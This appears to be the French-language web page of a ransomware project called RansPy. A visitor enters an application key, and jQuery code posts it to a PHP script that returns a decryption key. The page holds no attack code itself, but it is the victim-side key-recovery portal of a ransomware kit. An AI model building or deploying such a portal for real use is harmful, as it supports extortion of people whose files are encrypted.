<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
	<!--[if IE]>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<![endif]-->
    <title>RansPy</title>
	
	 <link rel="stylesheet" type="text/css" href="css/style.css">
	<script type="text/javascript" src="js/jquery-min.js"></script>
</head>
<body>
	<div class="container">
		<form id="contact">
			<a href="" title="RansPy">
				<img id="logo" title="RansPy" src="img/logo-ranspy.png" alt="RansPy" width="210px"/>
			</a>
			<h1 id="main-title">RansPy</h1>
			<fieldset>
				<h4 id="sub-title">Entrez la clé fournie par RansPy.</h4>
				<input id="software_key" name="software_key" placeholder="Clé d'application" type="text" required>
			</fieldset>
			<fieldset>
				<button id="submit" name="submit" type="submit">Demander ma clé de décryptage</button>
			</fieldset>
			<fieldset>
				<h4 id="result-ko">Aucune clé de décryptage trouvée.</h4>
				<h4 id="result-ok">Votre clé de décryptage :</h4>
				<h4 id="decrypt_key"></h4>
				<a id="link_return" href="" title="Retour"><h4>Retour</h4></a>
			</fieldset>
			<p class="copyright">Copyright &copy; <?php echo date("Y"); ?> <a title="quentin-klymyk.fr" href="http://quentin-klymyk.fr/" target="_blank">quentin-klymyk.fr</a> - RansPy. Tous droits réservés.</p>
		</form>
	</div>
	
	<script>
		$(document).ready(function(){
			$("#submit").click(function(event) {
				if ($("#software_key").val() != "") {
					event.preventDefault();
					$("#submit").attr("disabled", "true");
					
					// AJAX Code To Submit Form.
					var request = $.ajax({
						url: "php/get_decrypt_code.php",
						method: "POST",
						data: { software_key : $("#software_key").val() },
						dataType: "text",
					});
					request.done(function(data) {
						if (data == "Failed" ) {
							$("body").css("background", "#EF3125");
							$("#logo").attr("src", "img/logo-ranspy.png");
							$("#main-title").css("color", "#EF3125");
							$("#software_key").hide();
							$("#submit").css("background", "#EF3125");
							$("#submit").attr("disabled", "false");
							$("#sub-title").hide();
							$("#submit").hide();
							$("#result-ko").show();
							$("#link_return").show();
						}
						else {
							$("body").css("background", "#43A047");
							$("#logo").attr("src", "img/logo-ranspy-ok.png");
							$("#main-title").css("color", "#43A047");
							$("#submit").css("background", "#43A047");
							$('#submit').attr('disabled', "false");
							$("#sub-title").hide();
							$("#software_key").hide();
							$("#submit").hide();
							$("#result-ok").show();
							$("#decrypt_key").text(data);
							$("#decrypt_key").show();
							$("#link_return").show();
						}
					})
					request.fail(function(jqXHR, textStatus) {
						console.log("Erreur : " + textStatus);
						$("#submit").attr("disabled", "false");
					});
				}
			});
		});
	</script>
</body>
</html>